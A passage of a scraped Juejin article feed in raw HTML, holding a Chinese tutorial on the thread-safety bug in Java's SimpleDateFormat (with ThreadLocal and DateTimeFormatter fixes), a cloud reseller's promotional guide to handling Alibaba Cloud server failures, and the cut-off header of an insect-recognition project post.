                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、Bug 场景</h2>
<p>在一个电商系统中，需要将用户下单时间以特定格式展示给用户，同时在后台也会基于这个格式化后的时间进行一些数据统计和分析。开发人员使用 <code>SimpleDateFormat</code> 类对日期进行格式化操作。</p>
<h2 data-id="heading-1">二、代码示例</h2>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.text.ParseException;
<span class="hljs-keyword">import</span> java.text.SimpleDateFormat;
<span class="hljs-keyword">import</span> java.util.Date;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DateFormatBug</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">SimpleDateFormat</span> <span class="hljs-variable">dateFormat</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDateFormat</span>(<span class="hljs-string">"yyyy - MM - dd HH:mm:ss"</span>);

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 模拟获取到的订单时间字符串</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">orderTimeStr</span> <span class="hljs-operator">=</span> <span class="hljs-string">"2023 - 10 - 15 14:30:00"</span>;

        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Date</span> <span class="hljs-variable">orderDate</span> <span class="hljs-operator">=</span> dateFormat.parse(orderTimeStr);
            System.out.println(<span class="hljs-string">"解析后的日期: "</span> + dateFormat.format(orderDate));
        } <span class="hljs-keyword">catch</span> (ParseException e) {
            System.out.println(<span class="hljs-string">"日期解析错误: "</span> + e.getMessage());
        }


        <span class="hljs-comment">// 多线程环境下测试</span>
        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-type">Date</span> <span class="hljs-variable">date1</span> <span class="hljs-operator">=</span> dateFormat.parse(<span class="hljs-string">"2023 - 10 - 16 10:00:00"</span>);
                System.out.println(<span class="hljs-string">"线程 1 解析后的日期: "</span> + dateFormat.format(date1));
            } <span class="hljs-keyword">catch</span> (ParseException e) {
                System.out.println(<span class="hljs-string">"线程 1 日期解析错误: "</span> + e.getMessage());
            }
        });

        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-type">Date</span> <span class="hljs-variable">date2</span> <span class="hljs-operator">=</span> dateFormat.parse(<span class="hljs-string">"2023 - 10 - 17 15:30:00"</span>);
                System.out.println(<span class="hljs-string">"线程 2 解析后的日期: "</span> + dateFormat.format(date2));
            } <span class="hljs-keyword">catch</span> (ParseException e) {
                System.out.println(<span class="hljs-string">"线程 2 日期解析错误: "</span> + e.getMessage());
            }
        });

        thread1.start();
        thread2.start();
    }
}
</code></pre>
<h2 data-id="heading-2">三、问题描述</h2>
<ol>
<li><strong>单线程情况</strong>：乍一看，代码在单线程环境下运行良好，能正确地将字符串解析为 <code>Date</code> 对象并格式化输出。例如，上述代码在单线程执行 <code>main</code> 方法时，输出结果符合预期：</li>
</ol>
<pre><code class="hljs language-plaintext" lang="plaintext">解析后的日期: 2023 - 10 - 15 14:30:00
</code></pre>
<ol start="2">
<li><strong>多线程情况</strong>：然而，在多线程环境下，<code>SimpleDateFormat</code> 不是线程安全的。当多个线程同时使用同一个 <code>SimpleDateFormat</code> 实例进行日期解析和格式化操作时，可能会出现不可预测的结果，比如抛出 <code>ParseException</code> 或者得到错误的格式化日期。在上述代码中启动 <code>thread1</code> 和 <code>thread2</code> 后，可能会出现以下错误输出：</li>
</ol>
<pre><code class="hljs language-plaintext" lang="plaintext">线程 1 日期解析错误: Unparseable date: "2023 - 10 - 16 10:00:00"
线程 2 日期解析错误: Unparseable date: "2023 - 10 - 17 15:30:00"
</code></pre>
<p>这是因为 <code>SimpleDateFormat</code> 内部维护了一些状态信息，如日历对象等，多个线程并发访问和修改这些状态时会相互干扰，导致解析或格式化失败。</p>
<h2 data-id="heading-3">四、解决方案</h2>
<ol>
<li><strong>线程局部变量（ThreadLocal）</strong> ：可以使用 <code>ThreadLocal</code> 为每个线程创建独立的 <code>SimpleDateFormat</code> 实例，避免多线程之间的状态干扰。</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.text.ParseException;
<span class="hljs-keyword">import</span> java.text.SimpleDateFormat;
<span class="hljs-keyword">import</span> java.util.Date;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DateFormatBugFixed</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> ThreadLocal&lt;SimpleDateFormat&gt; dateFormatThreadLocal = ThreadLocal.withInitial(() -&gt; <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDateFormat</span>(<span class="hljs-string">"yyyy - MM - dd HH:mm:ss"</span>));

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 模拟获取到的订单时间字符串</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">orderTimeStr</span> <span class="hljs-operator">=</span> <span class="hljs-string">"2023 - 10 - 15 14:30:00"</span>;

        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Date</span> <span class="hljs-variable">orderDate</span> <span class="hljs-operator">=</span> dateFormatThreadLocal.get().parse(orderTimeStr);
            System.out.println(<span class="hljs-string">"解析后的日期: "</span> + dateFormatThreadLocal.get().format(orderDate));
        } <span class="hljs-keyword">catch</span> (ParseException e) {
            System.out.println(<span class="hljs-string">"日期解析错误: "</span> + e.getMessage());
        }


        <span class="hljs-comment">// 多线程环境下测试</span>
        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-type">Date</span> <span class="hljs-variable">date1</span> <span class="hljs-operator">=</span> dateFormatThreadLocal.get().parse(<span class="hljs-string">"2023 - 10 - 16 10:00:00"</span>);
                System.out.println(<span class="hljs-string">"线程 1 解析后的日期: "</span> + dateFormatThreadLocal.get().format(date1));
            } <span class="hljs-keyword">catch</span> (ParseException e) {
                System.out.println(<span class="hljs-string">"线程 1 日期解析错误: "</span> + e.getMessage());
            }
        });

        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-type">Date</span> <span class="hljs-variable">date2</span> <span class="hljs-operator">=</span> dateFormatThreadLocal.get().parse(<span class="hljs-string">"2023 - 10 - 17 15:30:00"</span>);
                System.out.println(<span class="hljs-string">"线程 2 解析后的日期: "</span> + dateFormatThreadLocal.get().format(date2));
            } <span class="hljs-keyword">catch</span> (ParseException e) {
                System.out.println(<span class="hljs-string">"线程 2 日期解析错误: "</span> + e.getMessage());
            }
        });

        thread1.start();
        thread2.start();
    }
}
</code></pre>
<ol start="2">
<li><strong>使用 Java 8 的 DateTimeFormatter</strong>：Java 8 引入的 <code>DateTimeFormatter</code> 是线程安全的。可以使用它来替代 <code>SimpleDateFormat</code>。</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.time.LocalDateTime;
<span class="hljs-keyword">import</span> java.time.format.DateTimeFormatter;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DateTimeFormatterExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">DateTimeFormatter</span> <span class="hljs-variable">formatter</span> <span class="hljs-operator">=</span> DateTimeFormatter.ofPattern(<span class="hljs-string">"yyyy - MM - dd HH:mm:ss"</span>);

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 模拟获取到的订单时间字符串</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">orderTimeStr</span> <span class="hljs-operator">=</span> <span class="hljs-string">"2023 - 10 - 15 14:30:00"</span>;

        <span class="hljs-type">LocalDateTime</span> <span class="hljs-variable">orderDateTime</span> <span class="hljs-operator">=</span> LocalDateTime.parse(orderTimeStr, formatter);
        System.out.println(<span class="hljs-string">"解析后的日期: "</span> + orderDateTime.format(formatter));


        <span class="hljs-comment">// 多线程环境下测试</span>
        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-type">LocalDateTime</span> <span class="hljs-variable">date1</span> <span class="hljs-operator">=</span> LocalDateTime.parse(<span class="hljs-string">"2023 - 10 - 16 10:00:00"</span>, formatter);
            System.out.println(<span class="hljs-string">"线程 1 解析后的日期: "</span> + date1.format(formatter));
        });

        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-type">LocalDateTime</span> <span class="hljs-variable">date2</span> <span class="hljs-operator">=</span> LocalDateTime.parse(<span class="hljs-string">"2023 - 10 - 17 15:30:00"</span>, formatter);
            System.out.println(<span class="hljs-string">"线程 2 解析后的日期: "</span> + date2.format(formatter));
        });

        thread1.start();
        thread2.start();
    }
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[阿里云渠道商：阿里云服务器出问题如何处理？]]></title>    <link>https://juejin.cn/post/7577189654488891442</link>    <guid>https://juejin.cn/post/7577189654488891442</guid>    <pubDate>2025-11-27T08:56:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577189654488891442" data-draft-id="7577050643202900018" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="阿里云渠道商：阿里云服务器出问题如何处理？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-11-27T08:56:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="云渠道商yunshuguoji"/> <meta itemprop="url" content="https://juejin.cn/user/3854235718130362"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            阿里云渠道商：阿里云服务器出问题如何处理？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3854235718130362/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    云渠道商yunshuguoji
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T08:56:26.000Z" title="Thu Nov 27 2025 08:56:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、引言</h2>
<p>云服务器故障是业务运营中的高概率事件，据统计，超过80%的企业每年至少经历一次严重影响业务的云服务中断。正确的故障响应流程可将平均恢复时间（MTTR）从小时级缩短至分钟级，减少90%的业务损失。通过系统化的故障处理机制，企业不仅能快速恢复业务，更能从中积累经验，提升系统韧性。如果你还没有上云账号或上云实际使用云服务过程中有不懂的，可寻云枢国际yunshuguoji免卡上云用云以及获得专业的技术支持和折扣。
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/888deed4d75d432db1da6a644db34afb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LqR5rig6YGT5ZWGeXVuc2h1Z3Vvamk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764838585&amp;x-signature=3HjT%2FiyYHXFeJxBI0NFq%2Fng15dE%3D" alt="3e90dd9372b04e95ac41846763b4ef0c~tplv-obj.png" loading="lazy"/></p>
<h2 data-id="heading-1">二、故障处理核心原则</h2>
<h2 data-id="heading-2">1. 优先级划分标准</h2>
<p><strong>进行业务影响评估矩阵</strong></p>
<p><strong>优先级定义</strong>：</p>
<p>P0（紧急）：核心业务完全不可用，需立即全员响应</p>
<p>P1（高）：关键功能受损，1小时内必须处理</p>
<p>P2（中）：部分功能受影响，4小时内处理</p>
<p>P3（低）：轻微问题，24小时内解决</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ab59ff492ddd48fe88652b1e22efaaab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LqR5rig6YGT5ZWGeXVuc2h1Z3Vvamk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764838585&amp;x-signature=sX1vjnEwL%2FGVNUChsYRSzqh6ho8%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<h2 data-id="heading-3">三、故障诊断与处理流程</h2>
<h2 data-id="heading-4">1. 初步诊断与信息收集</h2>
<p><strong>故障识别检查表</strong>：</p>
<p>第一步: 症状分析</p>
<p>业务层面:</p>
<p>网站/应用是否可访问?</p>
<p>功能是否正常?</p>
<p>用户报告哪些错误?</p>
<p>系统层面:</p>
<p>服务器能否连接?</p>
<p>资源使用率是否异常?</p>
<p>日志有无错误信息?</p>
<p>第二步: 影响范围评估</p>
<p>受影响业务: [列出具体业务]</p>
<p>影响用户数: [预估影响范围]</p>
<p>数据完整性: [是否有数据丢失风险]</p>
<p><strong>2.四步应急处理流程</strong></p>






























<table><thead><tr><th><strong>步骤</strong></th><th><strong>操作指引</strong></th><th><strong>预期耗时</strong></th></tr></thead><tbody><tr><td><strong>1. 基础诊断</strong></td><td>登录控制台 → 查看「云监控」中的 CPU / 内存 / 带宽峰值（&gt;90% 需扩容）</td><td>3 分钟</td></tr><tr><td><strong>2. 网络检查</strong></td><td>进入「安全组」→ 验证端口开放状态（常见问题：SSH 22 端口被误关闭）</td><td>2 分钟</td></tr><tr><td><strong>3. 快速恢复</strong></td><td>使用「实例重启」功能（非强制重启，保留数据）</td><td>1 分钟</td></tr><tr><td><strong>4. 根因排查</strong></td><td>下载「系统日志」→ 搜索关键词 error/timeout</td><td/></tr></tbody></table>
<h2 data-id="heading-5">3. 数据恢复优先级排序：</h2>
<ol>
<li><strong>核心业务功能</strong>：确保主要业务流可运行</li>
<li><strong>数据完整性</strong>：恢复最新可用数据</li>
</ol>
<p>辅助功能：非核心功能可稍后恢复</p>
<h2 data-id="heading-6">四、总结</h2>
<h2 data-id="heading-7">1. 故障处理黄金法则</h2>
<p><strong>响应阶段要点</strong>：</p>
<ul>
<li><strong>先恢复，后排查</strong>：优先保证业务连续性</li>
<li><strong>沟通透明</strong>：及时向相关方通报处理进展</li>
<li><strong>文档记录</strong>：详细记录所有操作和现象</li>
</ul>
<p><strong>技术操作原则</strong>：</p>
<ul>
<li><strong>变更谨慎</strong>：生产环境变更要有回滚方案</li>
<li><strong>数据安全</strong>：确保操作不会导致数据丢失</li>
<li><strong>影响评估</strong>：评估操作对业务的影响范围</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[昆虫识别系统【最新版】Python+TensorFlow+Vue3+Django+人工智能+深度学习+卷积神经网络算法]]></title>    <link>https://juejin.cn/post/7577016562252103731</link>    <guid>https://juejin.cn/post/7577016562252103731</guid>    <pubDate>2025-11-27T07:06:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577016562252103731" data-draft-id="7576978338755002418" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="昆虫识别系统【最新版】Python+TensorFlow+Vue3+Django+人工智能+深度学习+卷积神经网络算法"/> <meta itemprop="keywords" content="后端,图像识别"/> <meta itemprop="datePublished" content="2025-11-27T07:06:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ziwu"/> <meta itemprop="url" content="https://juejin.cn/user/607373397353726"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            昆虫识别系统【最新版】Python+TensorFlow+Vue3+Django+人工智能+深度学习+卷积神经网络算法
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/607373397353726/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ziwu
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T07:06:48.000Z" title="Thu Nov 27 2025 07:06:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
